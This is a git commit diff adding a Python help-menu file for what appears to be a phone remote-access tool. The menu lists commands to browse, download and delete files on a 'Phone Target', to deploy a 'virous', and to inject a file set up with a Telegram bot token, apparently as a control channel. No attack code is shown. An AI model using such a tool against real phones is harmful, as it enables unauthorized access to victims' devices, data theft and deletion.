9550e4e241d96f2ba9ebe1a8c8fdeb22eba8e1fd
issamiso <101994309+issamiso@users.noreply.github.com>
2022-12-24 20:25:42 +0100

    Add files via upload

---
+++ backstart/helper/__backhelp__.py
@@ -0,0 +1,26 @@
+print=("""\33[0m
+   +-----------------------------------------+
+   ¦               command help              ¦
+   -------------------------------------------
+   ¦ cd /sdcard # open sdcard Phone Target   ¦
+   ¦ ls #                                    ¦
+   ¦ pwd # path in Phone Target              ¦ 
+   -------------------------------------------
+   ¦ download from Phone Target              ¦
+   ¦ remove and name files and path          ¦
+   -------------------------------------------
+   ¦ remove file in Phone Target             ¦
+   ¦ remove and name file                    ¦
+   -------------------------------------------
+   ¦ virous in Phone Target                  ¦
+   ¦ virous                                  ¦
+   -------------------------------------------
+   ¦ injected file in Phone Target           ¦
+   ¦ set host # Token Telegram               ¦  
+   ¦ set port # Id telegrma                  ¦
+   -------------------------------------------
+   ¦ # Please Report This bug To My Facebook ¦ 
+   ¦ # https://www.facebook.com/isohacking   ¦
+   ¦ # Telegram : @i_4iS_exe                 ¦
+   +-----------------------------------------+
+""")
